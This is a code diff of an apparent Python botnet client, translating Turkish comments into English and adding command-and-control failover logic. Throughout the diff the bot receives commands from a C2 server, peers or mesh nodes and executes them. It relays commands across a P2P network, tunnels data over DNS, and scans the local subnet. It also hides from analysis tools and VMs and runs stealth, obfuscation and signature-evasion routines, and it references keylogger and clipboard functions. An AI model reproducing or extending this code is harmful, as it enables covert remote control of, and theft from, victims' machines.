             dns_query = f"{encoded_data}.{self.dns_tunnel_domain}"
             
-            # TXT record sorgula
             answers = dns.resolver.resolve(dns_query, 'TXT')
             
-            return len(data)  # Başarılı
+            return len(data)  # Successful
             
         except Exception as e:
             print(f"\033[91m[!] DNS send error: {e}\033[0m")
             return 0
     
     def _try_fallback_connection(self):
-        """Fallback bağlantı dene"""
-        print(f"\033[94m[!] Fallback bağlantılar deneniyor...\033[0m")
+        """Try fallback connection"""
+        print(f"\033[94m[!] Trying fallback connections...\033[0m")
         
-        # Tüm kanalları dene
+        # Try all channels
         for channel_name, channel in self.fallback_channels.items():
             if channel_name == self.connection_rotation['current_channel']:
                 continue
                 
-            print(f"\033[94m[!] {channel_name} kanalı deneniyor...\033[0m")
+            print(f"\033[94m[!] Trying {channel_name} channel...\033[0m")
             
             if channel['type'] == 'direct':
                 sock = self._connect_direct()
@@ -933,33 +928,33 @@ class Bot:
                 self.connection_rotation['current_channel'] = channel_name
                 return sock
         
-        # Hiçbiri çalışmadıysa Mesh fallback başlat
+        # Start Mesh fallback if none worked
         self._start_mesh_fallback()
         return None
 
     def _start_mesh_fallback(self):
-        """C2 başarısızsa Mesh fallback'i başlat"""
+        """Start Mesh fallback if C2 fails"""
         try:
             if not self.mesh_enabled:
                 return
             if self.mesh is not None:
                 return
-            # Dinamik import, sadece gerektiğinde
+            # Dynamic import, only when needed
             from MeshNetwork import MeshNode
             self.mesh = MeshNode(node_id=self.bot_id)
             self.mesh.start_time = time.time()
             if self.mesh.start_mesh():
-                print("\033[94m[*] Mesh fallback aktif (C2 erişilemiyor)\033[0m")
-                # Mesh komut işleyici thread'ini başlat
+                print("\033[94m[*] Mesh fallback active (C2 unreachable)\033[0m")
+                # Start Mesh command handler thread
                 self.mesh_command_thread = threading.Thread(target=self._handle_mesh_commands, daemon=True)
                 self.mesh_command_thread.start()
             else:
-                print("\033[93m[!] Mesh fallback başlatılamadı\033[0m")
+                print("\033[93m[!] Mesh fallback could not be started\033[0m")
         except Exception as e:
-            print(f"\033[93m[!] Mesh fallback hata: {e}\033[0m")
+            print(f"\033[93m[!] Mesh fallback error: {e}\033[0m")
 
     def _stop_mesh(self):
-        """C2 bağlantısı kurulunca Mesh'i durdur"""
+        """Stop Mesh when C2 connection is established"""
         try:
             if self.mesh is not None:
                 self.mesh.stop_mesh()
@@ -967,30 +962,30 @@ class Bot:
                 self.mesh_command_thread = None
                 print("\033[92m[+] Mesh fallback durduruldu (C2 aktif)\033[0m")
         except Exception as e:
-            print(f"\033[93m[!] Mesh durdurma hata: {e}\033[0m")
+            print(f"\033[93m[!] Mesh stop error: {e}\033[0m")
 
     def _handle_mesh_commands(self):
-        """Mesh'ten gelen komutları işle ve logla"""
+        """Process and log commands from Mesh"""
         while self.mesh and self.mesh.running:
             try:
                 if not self.mesh.command_queue.empty():
                     command = self.mesh.command_queue.get()
                     
-                    # Komut logla
+                    # Log command
                     self._log_mesh_command(command)
                     
-                    # Komutu çalıştır
+                    # Execute command
                     result = self.execute_command(command)
-                    print(f"\033[96m[MESH] Komut: {command}\033[0m")
-                    print(f"\033[92m[MESH] Sonuç: {result[:100]}...\033[0m" if len(str(result)) > 100 else f"\033[92m[MESH] Sonuç: {result}\033[0m")
+                    print(f"\033[96m[MESH] Command: {command}\033[0m")
+                    print(f"\033[92m[MESH] Result: {result[:100]}...\033[0m" if len(str(result)) > 100 else f"\033[92m[MESH] Result: {result}\033[0m")
                     
                 time.sleep(1)
             except Exception as e:
-                print(f"\033[93m[!] Mesh komut işleme hatası: {e}\033[0m")
+                print(f"\033[93m[!] Mesh command processing error: {e}\033[0m")
                 time.sleep(5)
 
     def _log_mesh_command(self, command):
-        """Mesh komutlarını dosyaya logla"""
+        """Log Mesh commands to file"""
         try:
             timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
             log_entry = f"[{timestamp}] Node: {self.bot_id} | Command: {command}\n"
@@ -998,10 +993,10 @@ class Bot:
             with open(self.mesh_log_file, "a", encoding="utf-8") as f:
                 f.write(log_entry)
         except Exception as e:
-            print(f"\033[93m[!] Mesh log hatası: {e}\033[0m")
+            print(f"\033[93m[!] Mesh log error: {e}\033[0m")
     
     def _rotate_connection(self):
-        """Bağlantı kanalını değiştir"""
+        """Change connection channel"""
         channels = list(self.fallback_channels.keys())
         current_index = channels.index(self.connection_rotation['current_channel'])
         next_index = (current_index + 1) % len(channels)
@@ -1009,17 +1004,17 @@ class Bot:
         self.connection_rotation['current_channel'] = channels[next_index]
         self.connection_rotation['last_rotation'] = time.time()
         
-        print(f"\033[94m[!] Bağlantı kanalı değiştirildi: {channels[next_index]}\033[0m")
+        print(f"\033[94m[!] Connection channel changed: {channels[next_index]}\033[0m")
     
     def _send_bot_info(self, sock):
-        """Bot bilgilerini gönder"""
+        """Send bot information"""
         # framing helpers
         def send_packet(s, payload: bytes):
             s.sendall(struct.pack('!I', len(payload)) + payload)
         bot_info = {
             'bot_id': self.bot_id,
             'platform': self.platform,
-            'real_ip': self._get_local_ip(),  # Gerçek IP'yi ekle
+            'real_ip': self._get_local_ip(),  # Add real IP
             'ipv6_enabled': self.ipv6_enabled,
             'p2p_active': self.p2p_active,
             'vuln_enabled': True,
@@ -1031,7 +1026,7 @@ class Bot:
         send_packet(sock, encrypted_info)
     
     def handle_bot(self, sock):
-        """Bot bağlantısını yönetir"""
+        """Manages bot connection"""
         try:
             # framing helpers
             def recv_exact(s, n:int) -> bytes:
@@ -1051,9 +1046,9 @@ class Bot:
             def send_packet(s, payload: bytes):
                 s.sendall(struct.pack('!I', len(payload)) + payload)
             while self.running:
-                # Analiz araçlarını kontrol et
+                # Check for analysis tools
                 if self.check_for_analysis_tools():
-                    print("[!] Analiz aracı tespit edildi, güvenli mod aktif")
+                    print("[!] Analysis tool detected, safe mode active")
                     time.sleep(self.analysis_wait_time)
                     continue
                 
@@ -1064,17 +1059,17 @@ class Bot:
                     if not data:
                         break
                     
-                    # Veriyi çöz
+                    # Decrypt data
                     decrypted_data = self.decrypt_c2(data)  # decrypt_c2 kullan
                     command_data = json.loads(decrypted_data)
                     
                     command = command_data.get('command', '')
-                    print(f"\033[94m[*] Komut alındı: {command}\033[0m")
+                    print(f"\033[94m[*] Command received: {command}\033[0m")
                     
-                    # Komutu çalıştır
+                    # Execute command
                     output = self.execute_command(command)
                     
-                    # Sonucu sunucuya gönder
+                    # Send result to server
                     response = {
                         'action': 'command_result',
                         'bot_id': self.bot_id,
@@ -1088,11 +1083,11 @@ class Bot:
                 except socket.timeout:
                     continue
                 except Exception as e:
-                    print(f"\033[91m[!] Komut işleme hatası: {str(e)}\033[0m")
+                    print(f"\033[91m[!] Command processing error: {str(e)}\033[0m")
                     continue
                     
         except Exception as e:
-            print(f"\033[91m[!] Bot yönetimi hatası: {str(e)}\033[0m")
+            print(f"\033[91m[!] Bot management error: {str(e)}\033[0m")
         finally:
             try:
                 sock.close()
@@ -1101,7 +1096,7 @@ class Bot:
             self.current_sock = None
     
     def _heartbeat_loop(self):
-        """Sunucu bağlantısını canlı tutmak için periyodik heartbeat gönderir"""
+        """Sends periodic heartbeat to keep server connection alive"""
         while True:
             try:
                 if getattr(self, 'current_sock', None):
@@ -1115,7 +1110,7 @@ class Bot:
                         # length-prefixed send
                         self.current_sock.sendall(struct.pack('!I', len(payload)) + payload)
                     except Exception:
-                        # Bağlantı koptuysa, socket'i sıfırla ki reconnect döngüsü devreye girsin
+                        # If connection dropped, reset socket so reconnect loop kicks in
                         try:
                             self.current_sock.close()
                         except Exception:
@@ -1128,193 +1123,315 @@ class Bot:
     # AI Analysis Run System : Disabled
 
     def _take_actions_based_on_analysis(self, analysis):
-        """AI analizine göre otomatik aksiyonlar al"""
+        """Take automatic actions based on AI analysis"""
         try:
             if not hasattr(self, 'stealth_mode') or not self.stealth_mode:
-                print(f"\033[94m[*] Bot başlatılıyor...\033[0m")
+                print(f"\033[94m[*] Bot starting...\033[0m")
                 print(f"\033[94m[*] Bot ID: {self.bot_id}\033[0m")
                 print(f"\033[94m[*] Platform: {self.platform}\033[0m")
-                print(f"\033[94m[*] IPv6: {'Aktif' if self.ipv6_enabled else 'Pasif'}\033[0m")
+                print(f"\033[94m[*] IPv6: {'Active' if self.ipv6_enabled else 'Passive'}\033[0m")
                 print(f"\033[94m[*] Anti-Analysis: {self.anti_analysis_mode}\033[0m")
-                print(f"\033[94m[*] Vuln Scanner: Aktif\033[0m")
+                print(f"\033[94m[*] Vuln Scanner: Active\033[0m")
             
-            # 🛡️ GÜÇLÜ OTOMATİK GİZLİLİK SİSTEMİ BAŞLAT
-            print(f"\033[94m[*] 🛡️ Güçlü gizlilik sistemi başlatılıyor...\033[0m")
+            # 🛡️ START STRONG AUTOMATIC STEALTH SYSTEM
+            print(f"\033[94m[*] 🛡️ Starting strong stealth system...\033[0m")
             
             # Strong AV Bypass System : Disabled :(
             
             # 2. Strong Signature Evasion System : Disabled :(
             
-            # 3. GÜÇLÜ OBFUSCATION
-            print(f"\033[94m[*] 🔐 Güçlü obfuscation sistemi aktifleştiriliyor...\033[0m")
+            # 3. STRONG OBFUSCATION
+            print(f"\033[94m[*] 🔐 Activating strong obfuscation system...\033[0m")
             obfuscation_result = self._powerful_obfuscation()
             if obfuscation_result:
-                print(f"\033[92m[+] ✅ Güçlü obfuscation başarılı\033[0m")
+                print(f"\033[92m[+] ✅ Strong obfuscation successful\033[0m")
             else:
-                print(f"\033[93m[!] ⚠️ Obfuscation kısmi başarı\033[0m")
+                print(f"\033[93m[!] ⚠️ Obfuscation partial success\033[0m")
             
-            # 4. GÜÇLÜ STEALTH MODE
-            print(f"\033[94m[*] 🥷 Güçlü stealth mode aktifleştiriliyor...\033[0m")
+            # 4. STRONG STEALTH MODE
+            print(f"\033[94m[*] 🥷 Activating strong stealth mode...\033[0m")
             stealth_result = self._powerful_stealth_mode()
             if stealth_result:
-                print(f"\033[92m[+] ✅ Güçlü stealth mode aktif\033[0m")
+                print(f"\033[92m[+] ✅ Strong stealth mode active\033[0m")
             else:
-                print(f"\033[93m[!] ⚠️ Stealth mode kısmi başarı\033[0m")
+                print(f"\033[93m[!] ⚠️ Stealth mode partial success\033[0m")
+            
+            # 5. Start connection failover monitor
+            print(f"\033[94m[*] 🔄 Starting connection failover monitor...\033[0m")
+            self.failover_thread = threading.Thread(target=self._connection_failover_monitor, daemon=True)
+            self.failover_thread.start()
+            print(f"\033[92m[+] ✅ Failover monitor started\033[0m")
             
             # Strong Anti-Analysis System : Disabled :(
             
-            # 6. GÜÇLÜ VM KONTROLÜ
-            print(f"\033[94m[*] 🖥️ Güçlü VM kontrolü yapılıyor...\033[0m")
+            # 6. STRONG VM CHECK
+            print(f"\033[94m[*] 🖥️ Performing strong VM check...\033[0m")
             vm_check = self._powerful_vm_detection()
             if vm_check:
-                print(f"\033[93m[!] ⚠️ VM tespit edildi, davranış değiştirildi\033[0m")
+                print(f"\033[93m[!] ⚠️ VM detected, behavior changed\033[0m")
             else:
-                print(f"\033[92m[+] ✅ VM tespit edilmedi\033[0m")
+                print(f"\033[92m[+] ✅ VM not detected\033[0m")
             
-            print(f"\033[92m[+] 🛡️ Güçlü gizlilik sistemi tamamlandı!\033[0m")
-            print(f"\033[94m[*] 🚀 Bot maksimum gizlilik modunda çalışıyor...\033[0m")
+            print(f"\033[92m[+] 🛡️ Strong stealth system completed!\033[0m")
+            print(f"\033[94m[*] 🚀 Bot running in maximum stealth mode...\033[0m")
             success = True
             
         except Exception as e:
-            print(f"\033[91m[!] Hata: Gizlilik sisteminde bir hata oluştu: {str(e)}\033[0m")
+            print(f"\033[91m[!] Error: An error occurred in stealth system: {str(e)}\033[0m")
             success = False
         
-        # 🎯 OTOMATİK SİSTEM KOPYALAMA SİSTEMİ BAŞLAT (SESSİZ)
-        # Sistem kopyalama sistemi arka planda sessizce çalışır
+        # 🎯 START AUTOMATIC SYSTEM COPY SYSTEM (SILENT)
+        # System copy system runs silently in background
         try:
             # copy_result = self._auto_system_copy() # Disabled for safety
             copy_result = {"status": "disabled", "message": "Auto-copy disabled for safety"}
         except Exception as e:
-            print(f"\033[91m[!] Sistem kopyalama hatası: {str(e)}\033[0m")
+            print(f"\033[91m[!] System copy error: {str(e)}\033[0m")
             
-        # Kalıcılık mekanizması oluştur
+        # Create persistence mechanism
         try:
             # self._create_persistence_mechanism() # Disabled for safety
             pass
         except Exception as e:
-            print(f"\033[91m[!] Kalıcılık mekanizması oluşturulurken hata: {str(e)}\033[0m")
+            print(f"\033[91m[!] Error creating persistence mechanism: {str(e)}\033[0m")
             
-        # P2P ağını başlat
+        # Start P2P network
         if hasattr(self, 'communication_config') and self.communication_config.get('p2p_enabled'):
             try:
                 p2p_result = self.start_p2p()
                 print(f"\033[94m[*] P2P: {p2p_result}\033[0m")
             except Exception as e:
-                print(f"\033[91m[!] P2P başlatılırken hata: {str(e)}\033[0m")
+                print(f"\033[91m[!] Error starting P2P: {str(e)}\033[0m")
+        
+        # Signature Evasion System - Automatic Activation
+        print(f"\033[94m[*] Activating Signature Evasion System...\033[0m")
+        try:
+            evasion_result = self.signature_evasion_system()
+            if evasion_result:
+                print(f"\033[92m[+] Signature Evasion activated: {evasion_result['success_rate']}% success rate\033[0m")
+                print(f"  \033[96m•\033[0m Techniques: {', '.join(evasion_result['applied_techniques'])}")
+            else:
+                print(f"\033[93m[!] Signature Evasion activation failed\033[0m")
+        except Exception as e:
+            print(f"\033[91m[!] Signature Evasion error: {str(e)}\033[0m")
         
         # AI Systems : Disabled
         
-        # Ana döngü
+        # Main loop
         while self.running:
             try:
-                # 🛡️ SÜREKLİ GİZLİLİK KONTROLÜ
+                # 🛡️ CONTINUOUS STEALTH CHECK
                 self._continuous_stealth_check()
                 
-                # Sunucuya bağlan
+                # Connect to server
                 sock = self.connect()
                 if not sock:
-                    print(f"\033[93m[!] Yeniden bağlanma deneniyor... ({self.reconnect_delay}s)\033[0m")
+                    print(f"\033[93m[!] Trying to reconnect... ({self.reconnect_delay}s)\033[0m")
                     time.sleep(self.reconnect_delay)
                     self.reconnect_delay = min(self.reconnect_delay * 2, self.max_reconnect_delay)
                     continue
                 
-                # Bağlantı başarılı, delay'i sıfırla
+                # Connection successful, reset delay
                 self.reconnect_delay = self.initial_reconnect_delay
                 self.current_sock = sock
                 
-                # Bot'u yönet
+                # Manage bot
                 self.handle_bot(sock)
                 
             except KeyboardInterrupt:
-                print(f"\033[93m[!] Kullanıcı tarafından durduruldu\033[0m")
+                print(f"\033[93m[!] Stopped by user\033[0m")
                 break
             except Exception as e:
-                print(f"\033[91m[!] Ana döngü hatası: {str(e)}\033[0m")
+                print(f"\033[91m[!] Main loop error: {str(e)}\033[0m")
                 time.sleep(5)  # Hata durumunda 5 saniye bekle
         
-        # Temizlik yap ve çık
+        # Cleanup and exit
         self.cleanup()
-        print(f"\033[94m[*] Bot durduruldu\033[0m")
+        print(f"\033[94m[*] Bot stopped\033[0m")
         return success
     
-    def cleanup(self):
-        """Temizlik işlemleri"""
+    def _connection_failover_monitor(self):
+        """Monitors C2 connection and manages automatic P2P failover"""
+        print("\033[94m[*] Connection failover monitor started\033[0m")
+        
+        while self.running:
+            try:
+                current_time = time.time()
+                
+                # C2 bağlantısı aktif mi kontrol et
+                c2_alive = self._check_c2_connection()
+                
+                if c2_alive:
+                    # C2 bağlı - P2P modundaysa kapat ve C2'ye dön
+                    if self.connection_mode == 'p2p':
+                        print("\033[92m[+] C2 connection restored! Switching back to C2 mode...\033[0m")
+                        self._stop_p2p_mode()
+                        self.connection_mode = 'c2'
+                        self.c2_connected = True
+                        self.c2_connection_lost_time = None
+                    else:
+                        self.c2_connected = True
+                else:
+                    # C2 bağlı değil
+                    self.c2_connected = False
+                    
+                    # İlk kez mi kesildi?
+                    if self.c2_connection_lost_time is None:
+                        self.c2_connection_lost_time = current_time
+                        print("\033[93m[!] C2 connection lost. Will failover to P2P in 5 seconds...\033[0m")
+                    
+                    # 5 saniye geçti mi ve P2P aktif değil mi?
+                    time_since_lost = current_time - self.c2_connection_lost_time
+                    if time_since_lost >= self.p2p_failover_delay and self.connection_mode == 'c2':
+                        if self.p2p_failover_enabled:
+                            print("\033[93m[!] C2 still down. Activating P2P mode...\033[0m")
+                            self._start_p2p_mode()
+                            self.connection_mode = 'p2p'
+                    
+                    # Her 60 saniyede bir C2'yi dene
+                    if current_time - self.last_c2_reconnect_attempt >= self.c2_reconnect_interval:
+                        self.last_c2_reconnect_attempt = current_time
+                        print("\033[94m[*] Attempting periodic C2 reconnection...\033[0m")
+                        # Deneme başarısız olursa P2P'de kal
+                
+                time.sleep(2)  # Her 2 saniyede bir kontrol
+                
+            except Exception as e:
+                print(f"\033[91m[!] Failover monitor error: {e}\033[0m")
+                time.sleep(5)
+    
+    def _check_c2_connection(self):
+        """Check if C2 connection is alive"""
         try:
-            # Keylogger'ı durdur
+            if self.current_sock:
+                # Socket hala açık mı kontrol et (non-blocking)
+                import select
+                ready, _, _ = select.select([self.current_sock], [], [], 0)
+                if ready:
+                    # Data var mı yoksa kapalı mı?
+                    try:
+                        data = self.current_sock.recv(1, socket.MSG_PEEK)
+                        if data == b'':
+                            return False  # Bağlantı kapalı
+                    except:
+                        pass
+                return True
+            return False
+        except:
+            return False
+    
+    def _start_p2p_mode(self):
+        """Start P2P mode as fallback"""
+        try:
+            if not self.p2p_active:
+                result = self.start_p2p()
+                print(f"\033[92m[+] P2P mode activated: {result}\033[0m")
+                
+                # Server'a P2P durumunu bildir
+                self._send_p2p_status_notification()
+        except Exception as e:
+            print(f"\033[91m[!] Failed to start P2P mode: {e}\033[0m")
+    
+    def _stop_p2p_mode(self):
+        """Stop P2P mode when C2 is back"""
+        try:
+            if self.p2p_active:
+                result = self.stop_p2p()
+                print(f"\033[92m[+] P2P mode deactivated: {result}\033[0m")
+        except Exception as e:
+            print(f"\033[91m[!] Failed to stop P2P mode: {e}\033[0m")
+    
+    def _send_p2p_status_notification(self):
+        """Send P2P status notification to any connected peers"""
+        try:
+            # Peer'lara durum bildirimi
+            status_msg = {
+                'action': 'p2p_status',
+                'bot_id': self.bot_id,
+                'p2p_status': 'active',
+                'timestamp': time.time()
+            }
+            # Bu mesaj P2P üzerinden broadcast edilebilir
+        except:
+            pass
+
+    def cleanup(self):
+        """Cleanup operations"""
+        try:
+            # Stop keylogger
             if self.keylogger_running:
                 self.keylogger_stop()
             
-            # Clipboard'ı durdur
+            # Stop clipboard
             if self.clipboard_active:
                 self.clipboard_stop()
             
-            # P2P'yi durdur
+            # Stop P2P
             if self.p2p_active:
                 self.stop_p2p()
             
-            # Mesh'i durdur
+            # Stop Mesh
             self._stop_mesh()
             
-            # Network mapping'i durdur
+            # Stop network mapping
             if self.network_mapping_active:
                 self.stop_network_mapping()
             
-            # Socket'leri kapat
+            # Close sockets
             if hasattr(self, 'current_sock') and self.current_sock:
                 self.current_sock.close()
             
-            print(f"\033[94m[*] Temizlik tamamlandı\033[0m")
+            print(f"\033[94m[*] Cleanup completed\033[0m")
             
         except Exception as e:
-            print(f"\033[91m[!] Temizlik hatası: {str(e)}\033[0m")
+            print(f"\033[91m[!] Cleanup error: {str(e)}\033[0m")
 
     def start_p2p(self):
-        """AI-Powered P2P ağını başlatır"""
         if self.p2p_active:
-            return "P2P zaten çalışıyor"
+            return "P2P already running"
             
         self.p2p_active = True
         
         try:
-            # AI-Powered P2P sistemi başlat
-            print(f"\033[94m[*] 🤖 AI-Powered P2P sistemi başlatılıyor...\033[0m")
+            # Start AI-Powered P2P system
+            print(f"\033[94m[*] 🤖 Starting AI-Powered P2P system...\033[0m")
             
-            # IPv6 desteğine göre socket oluştur
+            # Create socket based on IPv6 support
             if self.ipv6_enabled:
                 self.p2p_listener = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
                 self.p2p_listener.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_V6ONLY, 0)  # Dual-stack
-                bind_addr = ('::', self.p2p_port)  # IPv6 için
+                bind_addr = ('::', self.p2p_port)  # For IPv6
             else:
                 self.p2p_listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                bind_addr = ('0.0.0.0', self.p2p_port)  # IPv4 için
+                bind_addr = ('0.0.0.0', self.p2p_port)  # For IPv4
             
             self.p2p_listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
             self.p2p_listener.bind(bind_addr)
             self.p2p_listener.listen(5)
             self.p2p_listener.settimeout(2)
             
-            # AI-Powered P2P bileşenlerini başlat
+            # Start AI-Powered P2P components
             self._init_ai_p2p_components()
             
-            # AI-Powered P2P thread'ini başlat
+            # Start AI-Powered P2P thread
             self.p2p_thread = threading.Thread(target=self._ai_p2p_loop, daemon=True)
             self.p2p_thread.start()
             
-            # AI-Powered peer discovery başlat
+            # Start AI-Powered peer discovery
             self._start_ai_peer_discovery()
             
-            print(f"\033[92m[+] ✅ AI-Powered P2P başlatıldı (Port: {self.p2p_port}, IPv6: {self.ipv6_enabled})\033[0m")
-            return f"AI-Powered P2P ağı başlatıldı (Port: {self.p2p_port}, IPv6: {self.ipv6_enabled})"
+            print(f"\033[92m[+] ✅ AI-Powered P2P started (Port: {self.p2p_port}, IPv6: {self.ipv6_enabled})\033[0m")
+            return f"AI-Powered P2P network started (Port: {self.p2p_port}, IPv6: {self.ipv6_enabled})"
             
         except Exception as e:
             self.p2p_active = False
-            print(f"\033[91m[!] ❌ P2P başlatma hatası: {str(e)}\033[0m")
-            return f"P2P başlatma hatası: {str(e)}"
+            print(f"\033[91m[!] ❌ P2P startup error: {str(e)}\033[0m")
+            return f"P2P startup error: {str(e)}"
     
     def stop_p2p(self):
-        """P2P ağını durdurur"""
+        """Stops P2P network"""
         if not self.p2p_active:
-            return "P2P zaten çalışmıyor"
+            return "P2P not running"
             
         self.p2p_active = False
         
@@ -1324,33 +1441,33 @@ class Bot:
         if self.p2p_thread and self.p2p_thread.is_alive():
             self.p2p_thread.join(timeout=1.0)
             
-        return "P2P ağı durduruldu"
+        return "P2P network stopped"
     
     def _p2p_loop(self):
-        """P2P ağının ana döngüsü"""
+        """Main loop of P2P network"""
         while self.p2p_active and self.running:
             try:
-                # Wireshark kontrolü - eğer çalışıyorsa P2P'yi duraklat (Güvenlik Stratejisi #2)
+                # Wireshark check - pause P2P if running (Security Strategy #2)
                 if self.check_for_analysis_tools():
-                    print("[!] WireShark tespit edildi, P2P duraklatılıyor... (Security Rule #2)")
+                    print("[!] WireShark detected, pausing P2P... (Security Rule #2)")
                     self.analysis_detected = True
                     time.sleep(self.analysis_wait_time)
                     continue
                 
-                # Yeni bağlantıları kabul et
+                # Accept new connections
                 try:
                     conn, addr = self.p2p_listener.accept()
                     threading.Thread(target=self._handle_p2p_connection, args=(conn, addr)).start()
                 except socket.timeout:
                     pass
                 
-                # Peer keşif işlemi (belirli aralıklarla)
+                # Peer discovery process (at intervals)
                 current_time = time.time()
                 if current_time - self.last_p2p_discovery > self.p2p_interval:
                     self.last_p2p_discovery = current_time
                     self._discover_peers()
                     
-                # Bilinen peer'lara temel komutları gönder
+                # Send basic commands to known peers
                 self._share_basic_info()
                     
                 time.sleep(1)
@@ -1360,7 +1477,7 @@ class Bot:
                 time.sleep(5)
     
     def _handle_p2p_connection(self, conn, addr):
-        """Gelen P2P bağlantılarını işler"""
+        """Handles incoming P2P connections"""
         try:
             conn.settimeout(10)
             data = conn.recv(4096)
@@ -1369,12 +1486,12 @@ class Bot:
                 message = json.loads(decrypted)
                 
                 if message.get('action') == 'peer_hello':
-                    # Yeni peer ekle
+                    # Add new peer
                     peer_port = message.get('port')
                     self.known_peers.add((addr[0], peer_port))
-                    print(f"[+] Yeni peer eklendi: {addr[0]}:{peer_port}")
+                    print(f"[+] New peer added: {addr[0]}:{peer_port}")
                     
-                    # Yanıt gönder
+                    # Send response
                     response = {
                         'action': 'peer_ack',
                         'port': self.p2p_port,
@@ -1383,18 +1500,93 @@ class Bot:
                     conn.sendall(self.encrypt_data(json.dumps(response)))
                     
                 elif message.get('action') == 'peer_ack':
-                    # Peer onayı
+                    # Peer acknowledgment
                     peer_port = message.get('port')
                     self.known_peers.add((addr[0], peer_port))
-                    print(f"[+] Peer onayı alındı: {addr[0]}:{peer_port}")
+                    print(f"[+] Peer acknowledgment received: {addr[0]}:{peer_port}")
                     
                 elif message.get('action') == 'share_commands':
-                    # Komutları işle
+                    # Process commands
                     commands = message.get('commands', [])
                     for cmd in commands:
-                        print(f"[P2P] {addr[0]}'dan komut alındı: {cmd['command']}")
+                        print(f"[P2P] Command received from {addr[0]}: {cmd['command']}")
                         output = self.execute_command(cmd['command'])
-                        print(f"[P2P] Çıktı: {output}")
+                        print(f"[P2P] Output: {output}")
+                
+                elif message.get('action') == 'get_peers':
+                    # Return peer list
+                    peer_list = []
+                    for peer in self.known_peers:
+                        peer_list.append({'ip': peer[0], 'port': peer[1]})
+                    
+                    response = {
+                        'action': 'peer_list',
+                        'peers': peer_list
+                    }
+                    conn.sendall(self.encrypt_data(json.dumps(response)))
+                
+                elif message.get('action') == 'peer_list':
+                    # Received peer list from another peer
+                    new_peers = message.get('peers', [])
+                    for new_peer in new_peers:
+                        peer_tuple = (new_peer['ip'], new_peer['port'])
+                        if peer_tuple not in self.known_peers:
+                            self.known_peers.add(peer_tuple)
+                            print(f"[+] Peer discovered via mesh: {new_peer['ip']}:{new_peer['port']}")
+                
+                elif message.get('action') == 'relay_command':
+                    # Relayed command from another peer
+                    cmd_data = message.get('command_data')
+                    target_bot = cmd_data.get('target_bot')
+                    
+                    if target_bot == self.bot_id or self.bot_id in str(target_bot):
+                        # Execute locally
+                        command = cmd_data.get('command')
+                        source_bot = cmd_data.get('source_bot')
+                        print(f"[P2P] Relayed command from {source_bot}: {command}")
+                        output = self.execute_command(command)
+                        self._send_p2p_command_response(source_bot, command, output)
+                    else:
+                        # Forward to next peer (decrease TTL)
+                        ttl = message.get('ttl', 5) - 1
+                        if ttl > 0:
+                            cmd_data['ttl'] = ttl
+                            self._relay_command_to_peer(target_bot, cmd_data)
+                
+                elif message.get('action') == 'command_response':
+                    # Response from command execution
+                    source_bot = message.get('source_bot')
+                    command = message.get('command')
+                    output = message.get('output')
+                    print(f"[P2P] Response from {source_bot} for '{command}': {output[:100]}...")
+                    
+                    # If we're connected to C2, forward response
+                    if hasattr(self, 'current_sock') and self.current_sock:
+                        try:
+                            status_msg = {
+                                'type': 'p2p_command_response',
+                                'source_bot': source_bot,
+                                'command': command,
+                                'output': output
+                            }
+                            self.current_sock.sendall(self.encrypt_data(json.dumps(status_msg)))
+                        except:
+                            pass
+                
+                elif message.get('action') == 'ping':
+                    # Respond to ping
+                    pong_msg = {
+                        'action': 'pong',
+                        'bot_id': self.bot_id,
+                        'timestamp': time.time()
+                    }
+                    conn.sendall(self.encrypt_data(json.dumps(pong_msg)))
+                    
+                elif message.get('action') == 'pong':
+                    # Update peer heartbeat
+                    peer_id = message.get('bot_id')
+                    if peer_id in self.peer_registry:
+                        self.peer_registry[peer_id]['last_seen'] = time.time()
                         
         except Exception as e:
             print(f"[!] P2P connection error: {e}")
@@ -1404,20 +1596,20 @@ class Bot:
     # AI Peer Discovery : Disabled
     
     def _scan_network_for_peers(self):
-        """Network'te peer'ları tara"""
+        """Scan network for peers"""
         try:
             discovered_peers = []
             
-            # Local network range'ini al
+            # Get local network range
             local_ip = self._get_local_ip()
             network_base = '.'.join(local_ip.split('.')[:-1])
             
-            # P2P port aralığını tara
+            # Scan P2P port range
             for i in range(1, 255):
                 target_ip = f"{network_base}.{i}"
                 
-                # P2P port'larını kontrol et
-                for port in range(49152, 49162):  # İlk 10 port'u kontrol et
+                # Check P2P ports
+                for port in range(49152, 49162):  # Check first 10 ports
                     if self._check_peer_port(target_ip, port):
                         discovered_peers.append((target_ip, port))
                         print(f"\033[94m[*] Peer found: {target_ip}:{port}\033[0m")
@@ -1440,14 +1632,14 @@ class Bot:
             return False
     
     def _ping_peer(self, peer):
-        """Peer'a ping gönder"""
+        """Send ping to peer"""
         try:
             ip, port = peer
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             sock.settimeout(5)
             sock.connect((ip, port))
 
-            # P2P ping mesajı gönder
+            # Send P2P ping message
             ping_msg = {
                 'action': 'ping',
                         'bot_id': self.bot_id,
@@ -1467,7 +1659,7 @@ class Bot:
     # Big AI-P2P System : Disabled
 
     def _get_network_analysis(self):
-        """Network analizi döndürür"""
+        """Returns network analysis"""
         try:
             return {
                 'peer_count': len(self.known_peers),
@@ -1481,8 +1673,8 @@ class Bot:
     # AI Systems : Disabled
 
     def check_for_analysis_tools(self):
-        """Analiz araçlarını kontrol eder (Wireshark vs.)"""
-        target_tools = ["wireshark", "tshark", "tcpdump", "netstat", "nmap", "wireshark-gtk"]  # Daha fazla analiz aracı
+        """Checks for analysis tools (Wireshark etc.)"""
+        target_tools = ["wireshark", "tshark", "tcpdump", "netstat", "nmap", "wireshark-gtk"]  # More analysis tools
         
         try:
             if self.platform == 'windows':
@@ -1501,7 +1693,7 @@ class Bot:
                     executable='/bin/bash'
                 ).lower()
 
-            # Analiz araçları çalışıyor mu?
+            # Are analysis tools running?
             analysis_tools_detected = []
             for tool in target_tools:
                 if tool in output:
@@ -1509,14 +1701,14 @@ class Bot:
             
             analysis_detected = len(analysis_tools_detected) > 0
         
-            # Durum değiştiyse uyarı ekle
+            # Add alert if status changed
             if analysis_detected != self.analysis_detected:
                 self.analysis_detected = analysis_detected
                 if analysis_detected:
                     tools_str = ', '.join(analysis_tools_detected)
                     self._add_security_alert(
                         'analysis_tools_detected',
-                        f'Analiz araçları tespit edildi: {tools_str}',
+                        f'Analysis tools detected: {tools_str}',
                         'HIGH'
                     )
                     if hasattr(self, 'current_sock'):
